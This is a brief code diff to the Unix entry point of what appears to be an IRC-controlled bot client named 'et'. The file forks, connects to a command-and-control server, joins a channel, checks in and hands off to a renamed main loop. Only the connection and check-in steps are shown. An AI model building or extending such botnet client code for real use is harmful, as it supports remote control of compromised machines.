@@ -2,7 +2,7 @@
 	Author: William Woodruff
 	------------------------
 	The starting point for et on *nix systems.
-	Forks, connects to the IRC C&C server, says hello, then calls et_main_loop.
+	Forks, connects to the IRC C&C server, checks in, then calls et_main_loop_nix.
 */
 
 #include "et_main_loop_nix.h"
@@ -58,7 +58,7 @@ int main(int argc, char **argv[])
 		send(sock, join_str, strlen(join_str), 0);
 		send(sock, mesg_str, strlen(mesg_str), 0);
 
-		et_main_loop(sock, nick);
+		et_main_loop_nix(sock, nick);
 
 		send(sock, quit, strlen(quit), 0);
 		close(sock);
